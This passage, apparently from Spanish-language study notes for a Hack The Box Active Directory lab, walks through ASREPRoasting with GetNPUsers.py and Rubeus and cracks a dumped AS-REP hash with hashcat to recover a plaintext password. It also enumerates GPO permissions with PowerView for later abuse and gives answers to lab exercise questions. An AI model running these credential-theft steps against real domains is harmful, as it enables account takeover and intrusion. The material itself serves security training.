$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a

<SNIP>
```

{% endcode %}

Con una lista de usuarios válidos, podemos usar [Get-NPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) del kit de herramientas Impacket para buscar todos los usuarios que no requieren autenticación previa de Kerberos. La herramienta recuperará el AS-REP en formato Hashcat para descifrarlo sin conexión en caso de que se encuentre. También podemos introducir una lista de palabras como `jsmith.txt` en la herramienta, arrojará errores para los usuarios que no existen, pero si encuentra alguno válido sin autenticación previa de Kerberos, puede ser una buena forma de obtener un punto de apoyo o ampliar nuestro acceso, según en qué punto nos encontremos en el curso de nuestra evaluación. Incluso si no podemos descifrar el AS-REP usando Hashcat, sigue siendo bueno informar esto como un hallazgo a los clientes (solo que el riesgo es menor si no podemos descifrar la contraseña) para que puedan evaluar si la cuenta requiere o no esta configuración.

**Búsqueda de usuarios con autorización previa Kerberoast no requerida**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

{% endcode %}

Ahora hemos cubierto algunas formas en las que podemos realizar un ataque ASREPRoasting desde hosts de Windows y Linux y hemos visto cómo no necesitamos estar en un host unido a un dominio para:

1. Enumerar cuentas que no requieren autenticación previa de Kerberos
2. Realizar este ataque y obtener un AS-REP para descifrar sin conexión para ganar un punto de apoyo en el dominio o ampliar nuestro acceso.

***

### Abuso de objetos de directiva de grupo (GPO)

La directiva de grupo proporciona a los administradores muchas configuraciones avanzadas que se pueden aplicar tanto a objetos de usuario como de computadora en un entorno de AD. La directiva de grupo, cuando se utiliza correctamente, es una herramienta excelente para reforzar un entorno de AD mediante la configuración de los ajustes de usuario, los sistemas operativos y las aplicaciones.&#x20;

Dicho esto, los atacantes también pueden abusar de la directiva de grupo. Si podemos obtener derechos sobre un objeto de directiva de grupo mediante una configuración incorrecta de la ACL, podríamos aprovechar esto para el movimiento lateral, la escalada de privilegios e incluso la vulneración del dominio y como mecanismo de persistencia dentro del dominio. Comprender cómo enumerar y atacar los GPO puede darnos una ventaja y, a veces, puede ser la clave para lograr nuestro objetivo en un entorno bastante bloqueado.

Las configuraciones incorrectas de GPO se pueden aprovechar para realizar los siguientes ataques:

* Agregar derechos adicionales a un usuario (como SeDebugPrivilege, SeTakeOwnershipPrivilege o SeImpersonatePrivilege)
* Cómo agregar un usuario administrador local a uno o más hosts
* Crear una tarea programada inmediata para realizar cualquier cantidad de acciones

Podemos enumerar la información de GPO utilizando muchas de las herramientas que hemos utilizado a lo largo de este módulo, como PowerView y BloodHound. También podemos utilizar [group3r](https://github.com/Group3r/Group3r) , [ADRecon](https://github.com/sense-of-security/ADRecon) , [PingCastle](https://www.pingcastle.com/) , entre otras, para auditar la seguridad de los GPO en un dominio.

Usando la función [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) de PowerView, podemos obtener una lista de GPO por nombre.

#### **Enumeración de nombres de GPO con PowerView**

```powershell
PS C:\htb> Get-DomainGPO | select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

Esto puede resultarnos útil para comenzar a ver qué tipos de medidas de seguridad están implementadas (como denegar el acceso a cmd.exe y una política de contraseñas independiente para las cuentas de servicio). Podemos ver que se está utilizando el inicio de sesión automático, lo que puede significar que hay una contraseña legible en un GPO, y ver que los Servicios de certificados de Active Directory (AD CS) están presentes en el dominio. Si las herramientas de administración de directivas de grupo están instaladas en el host desde el que estamos trabajando, podemos usar varios [cmdlets de GroupPolicy](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) integrados (cómo `Get-GPO`) para realizar la misma enumeración.

#### **Enumeración de nombres de GPO con un cmdlet integrado**

```powershell
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

A continuación, podemos comprobar si un usuario que podemos controlar tiene algún derecho sobre una GPO. Es posible que se concedan derechos a usuarios o grupos específicos para administrar una o más GPO. Una buena primera comprobación es ver si todo el grupo de usuarios del dominio tiene algún derecho sobre una o más GPO.

#### **Enumeración de los derechos de GPO de los usuarios del dominio**

```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

Aquí podemos ver que el grupo `Domain Users` tiene varios permisos sobre un GPO, como `WriteProperty` y `WriteDacl`, que podríamos aprovechar para darnos un control total sobre el GPO y ejecutar cualquier cantidad de ataques que se enviarían a cualquier usuario y computadora en las unidades organizativas a las que se aplica el GPO. Podemos usar el GUID del GPO combinado con `Get-GPO` para ver el nombre para mostrar del GPO.

**Convertir GUID de GPO a nombre**

```powershell
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

Al verificar en BloodHound, podemos ver que el grupo `Domain Users` tiene varios derechos sobre el GPO `Disconnect Idle RDP`, que podrían aprovecharse para obtener el control total del objeto.

![imagen](https://academy.hackthebox.com/storage/modules/143/gporights.png)

Si seleccionamos el GPO en BloodHound y nos desplazamos hacia abajo hasta `Affected Objects` en la pestaña `Node Info`, podemos ver que este GPO se aplica a una OU, que contiene cuatro objetos de computadora.

![imagen](https://academy.hackthebox.com/storage/modules/143/gpoaffected.png)

Podríamos utilizar una herramienta como [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) para aprovechar esta configuración incorrecta de GPO realizando acciones como agregar un usuario que controlamos al grupo de administradores locales en uno de los hosts afectados, crear una tarea programada inmediata en uno de los hosts para proporcionarnos un shell inverso o configurar un script de inicio de computadora malicioso para proporcionarnos un shell inverso o algo similar. Al utilizar una herramienta como esta, debemos tener cuidado porque se pueden ejecutar comandos que afecten a todos los equipos dentro de la OU a la que está vinculada la GPO. Si encontramos una GPO editable que se aplica a una OU con 1000 equipos, no querríamos cometer el error de agregarnos como administrador local a esa cantidad de hosts. Algunas de las opciones de ataque disponibles con esta herramienta nos permiten especificar un usuario o host de destino. Los hosts que se muestran en la imagen anterior no son explotables y los ataques GPO se tratarán en profundidad en un módulo posterior.

***

## <mark style="color:purple;">Caso práctico</mark>

### Pregunta 1

Busca otro usuario con el campo `passwd_notreqd` configurado. Envíe el nombre de cuenta Sam como respuesta. El nombre de cuenta de Sam comienza con la letra "y".

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                           useraccountcontrol
--------------                                                           ------------------
guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
```

Enontramos al usuario `ygroce` con `passwd_notreqd` configurado.

### Pregunta 2

Busque otro usuario con la opción "No requerir configuración de autenticación previa de Kerberos" habilitada. Realice un ataque ASREPRoasting contra este usuario, descifre el hash y envíe su contraseña en texto simple como respuesta.

```powershell
PS C:\Tools> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : ygroce
userprincipalname  : ygroce@inlanefreight.local
useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Vemos que el usuario `ygroce` también tiene habilitada la opción "No requerir configuración de autenticación previa de Kerberos", por lo que lo vamos a eplotar para obtener su contraseña en plano.

{% code overflow="wrap" %}

```powershell
PS C:\Tools> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : ygroce
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
[*] SamAccountName         : ygroce
[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
      $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:6F46D54362E1869A60C33C3265A9DA5D$277D605540B7ACB3D942AA5ECB0CD7D83C8BA3F3125F44D0B98111EC2E5C8EE6FBA41C531C728B0841D50E597BF16FCA69107D731802A8385498959879A4E269FCD4E0EC4C7B6CE695417FA0FACF759F15342D27F8E55C2F2086601E839E9F0B05A11AB8D82D8B34469462A4BC366F570924F990B6553719A38EEA79B4CF68D12418C474A48126F3E5F3B7E40BC5CC61E7B3BDD0E214F7AF5AB95B9E8006A407D1E2BF4F78532184FC2B10523A29C7C37BBF1C3B4EE7A38AFB576C0E9D2388A0DA187597655FDF1891A78BC3B8F98A50BCC14EA1D6BFC9DC51DC760A35340AC64A887E5A46E1FC30B5B13028EF5F35CD33F8E8489EFCC8761599
```

{% endcode %}

Copiamos el hash a un archivo de texto `ygroce_hash` en nuestra máquina de atacante,  lo vamos a crackear offline con hashcat y el modo 18200:

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 18200 ygroce_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:6f46d54362e1869a60c33c3265a9da5d$277d605540b7acb3d942aa5ecb0cd7d83c8ba3f3125f44d0b98111ec2e5c8ee6fba41c531c728b0841d50e597bf16fca69107d731802a8385498959879a4e269fcd4e0ec4c7b6ce695417fa0facf759f15342d27f8e55c2f2086601e839e9f0b05a11ab8d82d8b34469462a4bc366f570924f990b6553719a38eea79b4cf68d12418c474a48126f3e5f3b7e40bc5cc61e7b3bdd0e214f7af5ab95b9e8006a407d1e2bf4f78532184fc2b10523a29c7c37bbf1c3b4ee7a38afb576c0e9d2388a0da187597655fdf1891a78bc3b8f98a50bcc14ea1d6bfc9dc51dc760a35340ac64a887e5a46e1fc30b5b13028ef5f35cd33f8e8489efcc8761599:Pass@word
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:6f46d54362...761599
Time.Started.....: Thu Jul 25 13:30:12 2024 (5 secs)
Time.Estimated...: Thu Jul 25 13:30:17 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2009.9 kH/s (0.66ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10733568/14344385 (74.83%)
Rejected.........: 0/10733568 (0.00%)
Restore.Point....: 10731520/14344385 (74.81%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Pastilla -> PanSiE12
Hardware.Mon.#1..: Util: 72%
```

{% endcode %}

Crackeamos correctamente el hash y obtenemos la contraseña en plano de la cuenta ygroce: `Pass@word`

***

### Seguimos avanzando

Hemos visto varias configuraciones incorrectas con las que podemos toparnos durante una evaluación y hay muchas más que se tratarán en módulos más avanzados de Active Directory. Vale la pena familiarizarnos con la mayor cantidad posible de ataques, por lo que recomendamos investigar sobre temas como:

* Ataques de servicios de certificados de Active Directory (AD CS)
* Delegación restringida de Kerberos
* Delegación sin restricciones de Kerberos
* Delegación restringida basada en recursos de Kerberos (RBCD)

En las siguientes secciones, abordaremos brevemente cómo atacar las confianzas de AD. Se trata de un tema amplio y complicado que se tratará en profundidad en un módulo posterior.
